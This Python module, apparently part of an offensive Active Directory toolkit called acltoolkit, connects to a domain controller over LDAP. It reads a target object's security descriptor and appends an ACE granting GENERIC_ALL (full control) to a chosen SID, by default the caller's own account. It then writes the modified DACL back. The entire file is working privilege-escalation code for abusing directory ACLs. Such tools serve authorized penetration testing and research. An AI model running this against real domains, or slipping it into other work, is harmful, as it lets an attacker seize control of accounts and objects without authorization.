import argparse
import logging

import ldap3
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK

from acltoolkit.ldap import LDAPConnection, LDAPEntry
from acltoolkit.target import Target

class GiveGenericAll:
    def __init__(self, options: argparse.Namespace):
        self.options = options
        self.ldap_connection = None

        self.target = Target(options)

        self._security_descriptor = None
        self._object = None
        self._granted = None

    def connect(self):
        self.ldap_connection = LDAPConnection(self.options.scheme, self.target)
        self.ldap_connection.connect()
        
    def search(self, *args, **kwargs) -> 'list["LDAPEntry"]':
        return self.ldap_connection.search(*args, **kwargs)

    def write(self, *args, **kwargs) -> int:
        return self.ldap_connection.write(*args, **kwargs)

    def run(self):
        self.connect()

        logging.info("Find target object: %s" % self.object.get("distinguishedName"))
        logging.info("Granted object will be: %s" % self.granted.get("distinguishedName"))
        self.security_descriptor["Dacl"].aces.append(self.create_allow_ace(self.granted.get_raw("objectSid")))

        ret = self.write(self.object.get("distinguishedName"),  {'nTSecurityDescriptor':[ldap3.MODIFY_REPLACE, [self.security_descriptor.getData()]]})

        if ret['result'] == 0:
            logging.info("Granted GENERIC_ALL successfully !")
        else :
            if ret['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', ret['message'])
            elif ret['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', ret['message'])
            else:
                raise Exception('The server returned an error: %s', ret['message'])

    @property
    def object(self) -> LDAPEntry:
        if self._object is not None:
            return self._object

        object_sid = self.options.target_sid

        objects = self.search(
            "(objectSid=%s)" % object_sid,
            attributes=["distinguishedName", "nTSecurityDescriptor", "primaryGroupId"]
        )

        if len(objects) == 0:
            raise Exception("Could not find object with Sid: %s" % object_sid)

        self._object = objects[0]

        return self._object

    @property
    def granted(self) -> LDAPEntry:
        if self._granted is not None:
            return self._granted
        
        if self.options.granted_sid is not None:
            granted = self.search(
                "(objectSid=%s)" % self.options.granted_sid,
                attributes=["distinguishedName", "objectSid"]
            )
            if len(granted) == 0:
                raise Exception("Could not find granted user")
        else:
            granted = self.search(
                "(sAMAccountName=%s)"
                % self.target.username,
                attributes=["distinguishedName","objectSid"],
            )
        self._granted = granted[0]
        return self._granted

    
    @property
    def security_descriptor(self) -> SR_SECURITY_DESCRIPTOR:
        if self._security_descriptor is not None:
            return self._security_descriptor

        self._security_descriptor = SR_SECURITY_DESCRIPTOR()
        self._security_descriptor.fromString(self.object.get_raw("nTSecurityDescriptor"))

        return self.security_descriptor

    def create_allow_ace(self, sid: bytes):    
        nace = ACE()
        nace['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551 # Generic All
        acedata['Sid'] = LDAP_SID(sid)
        nace['Ace'] = acedata
        return nace

def give_genericall(options: argparse.Namespace):
    g = GiveGenericAll(options)
    g.run()
